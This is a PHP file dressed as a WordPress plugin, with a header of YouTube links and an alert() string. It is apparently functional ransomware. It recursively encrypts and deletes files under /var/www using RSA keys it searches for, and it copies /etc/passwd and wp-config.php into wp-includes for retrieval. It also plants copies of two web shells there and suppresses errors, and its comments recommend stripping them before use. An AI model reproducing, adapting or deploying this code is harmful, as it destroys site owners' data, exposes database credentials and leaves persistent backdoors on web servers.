<?php

/**
 * Plugin Name: https://www.youtube.com/watch?v=HkIAXskvoPY
 * Plugin URI: https://www.youtube.com/watch?v=qJf2YuwSX5Y
 * Description: https://www.youtube.com/watch?v=s7YxUzdjt0A
 * Version: 8.67-5309
 * Author: alert('Yours Truly, a real Fungi' <>0xdecae<>);
 * Author URI: https://www.youtube.com/watch?v=Snveg1qSQJ4
 * */

// This is an attempt at semi-obfuscated code. When putting this into
// practice, it would be wise to remove all the comments and extra lines.


// Scans for acceptable files to be krypted/dekrypted
function shnickelfritz($dir, $key, $csize, $cry)
{
	$files = array_diff(scandir($dir), array('.', '..'));

	foreach($files as $file) 
	{
		$path = $dir."/".$file; 
		if(is_dir($path))
		{
			shnickelfritz($path, $key, $csize, $cry);	
		}
		else if ($path != __FILE__ 
			and pathinfo($file)['extension'] != "key" 
			and pathinfo($file)['extension'] != "htaccess"
			and pathinfo($file)['extension'] != "kryptd"
			and pathinfo($file)['extension'] != "abc"
			and pathinfo($file)['extension'] != "Index.php"
			and pathinfo($file)['extension'] != "index.php"
			and pathinfo($file)['extension'] != "php"
			and $cry == true
		) 
		{		
			echo $path." is a file, krypting...\n";
			echo krypt($path, $key, $csize);	
		}
		else if (pathinfo($file)['extension'] == "kryptd" and $cry == false)
		{
			echo $path." is an encrypted file, dekrypting...\n";
			echo dkrypt($path, $key, $csize);
		}

	}
}

// Find target file or directory and register it into $var
function search($dir, $target, &$var, $isdir=false)
{
	$files = array_diff(scandir($dir), array('.', '..'));
	foreach($files as $file) 
	{
		$path = $dir."/".$file; 
		if( is_dir($path) )
		{
			if($file == $target and $isdir == true)
			{	
				$var = $path;
			}
			else
			{
				search($path, $target, $var, $isdir);
			}
		} 
		else if ($file == $target) 
		{
			$var = $path;
		}
	}
}

// Standard dekrypt function
function dkrypt($f, $key, $size)
{	
	$ciphertext = file_get_contents($f);
	$dest = substr($f, 0, -7);
	$out = '';

	while($ciphertext)
	{
		$chunk = substr($ciphertext, 0, $size);
		$ciphertext = substr($ciphertext, $size);
		$dkryptd = '';

		if (!openssl_private_decrypt($chunk, $dkryptd, $key))
		{
			return 'Failed to dekrypt data...';
		}
		
		$out .= $dkryptd;
	}
	$out = gzuncompress($out);
	file_put_contents($dest, $out);
	unlink($f);
}
// Standard kryptr function
function krypt($f, $key, $size)
{	
	$data = file_get_contents($f);
	$plaintext = gzcompress($data);
	$dest = $f . '.kryptd';
	$out = '';
	while($plaintext)
	{
		$chunk = substr($plaintext, 0, $size);
		$plaintext = substr($plaintext, $size);
		$kryptd = '';

		if (!openssl_public_encrypt($chunk, $kryptd, $key))
		{
			return 'Failed to encrypt data...';
		}
		$out .= $kryptd;
	}
	file_put_contents($dest, $out);
	unlink($f);
	return "Krypt of ".$f." successful!\n";
}

// Why do I have this
function yonk($target, $dest)
{
	$data = file_get_contents($target);
	file_put_contents($dest, $data);

}

// Can't let PHP limits stop us, can we?
error_reporting(0);
set_time_limit(0);
ini_set('memory_limit', '-1');

// Start HERE
$top = '/var/www';

// Cry about it
$tears = true;

// 4 da keys
$chunksize = 0;

// Climb
chdir($top);

// Init Keys
$pubkeypath = '';
$privkeypath = '';

// Set target files
$podostroma = '';
$waluigi = '';
$hohoho = '';
$paxillus = '';
$galerina = '';
$amanita = '/etc/passwd';

// I got da keys, [keys...]
search($top, 'Kartoffel.key', $privkeypath);
search($top, 'Zweibel.key', $pubkeypath);

// Wordpress stuffz
search($top, 'wp-config.php', $podostroma);
search($top, 'wp-includes', $waluigi, true);
search($top, 'wp-admin', $hohoho, true);

// Shells
search($top, '8675309-1.php', $paxillus);
search($top, '8675309-2.php', $galerina);

// Place the good stuff where it needs to be
yonk($amanita, $waluigi."/666p.abc");
yonk($podostroma, $waluigi."/666c.abc");
yonk($paxillus, $waluigi."/data-save1.php");
yonk($galerina, $waluigi."/data-save2.php");

// Find the keys, set options based on success
if (!$pkey = openssl_pkey_get_private('file://'.$privkeypath))
{
	if(!$pkey = openssl_pkey_get_public('file://'.$pubkeypath))
	{
		die("Failed to locate key. Exiting...");
	}
	$a_key = openssl_pkey_get_details($pkey);
	$chunksize = ceil($a_key['bits'] / 8) - 11;
}
else
{
	$tears = false;
	$a_key = openssl_pkey_get_details($pkey);
	$chunksize = ceil($a_key['bits'] / 8);
}

// Make kryptr go bbbbrrrrrrr
shnickelfritz($top, $pkey, $chunksize, $tears);

// LET THE MAN GO RONALD!
openssl_free_key($pkey);


// Remember, it's only scary if you want it to be
echo '   ______   ______     __         ______     ______        ______   ______     ______     __    __       '."\n";
echo '  /\__  _\ /\  __ \   /\ \       /\  ___\   /\  ___\      /\  ___\ /\  == \   /\  __ \   /\ "-./  \      '."\n";
echo '  \/_/\ \/ \ \  __ \  \ \ \____  \ \  __\   \ \___  \     \ \  __\ \ \  __<   \ \ \/\ \  \ \ \-./\ \     '."\n";
echo '     \ \_\  \ \_\ \_\  \ \_____\  \ \_____\  \/\_____\     \ \_\    \ \_\ \_\  \ \_____\  \ \_\ \ \_\    '."\n";
echo '      \/_/   \/_/\/_/   \/_____/   \/_____/   \/_____/      \/_/     \/_/ /_/   \/_____/   \/_/  \/_/    '."\n";
echo '                                                                                                 		'."\n";
echo '   ______   __  __     ______        __  __     ______     __  __     ______   ______   ______           '."\n";
echo '  /\__  _\ /\ \_\ \   /\  ___\      /\ \/ /    /\  == \   /\ \_\ \   /\  == \ /\__  _\ /\  == \          '."\n";
echo '  \/_/\ \/ \ \  __ \  \ \  __\      \ \  _"-.  \ \  __<   \ \____ \  \ \  _-/ \/_/\ \/ \ \  __<          '."\n";
echo '     \ \_\  \ \_\ \_\  \ \_____\     \ \_\ \_\  \ \_\ \_\  \/\_____\  \ \_\      \ \_\  \ \_\ \_\        '."\n";
echo '      \/_/   \/_/\/_/   \/_____/      \/_/\/_/   \/_/ /_/   \/_____/   \/_/       \/_/   \/_/ /_/        '."\n";

?>

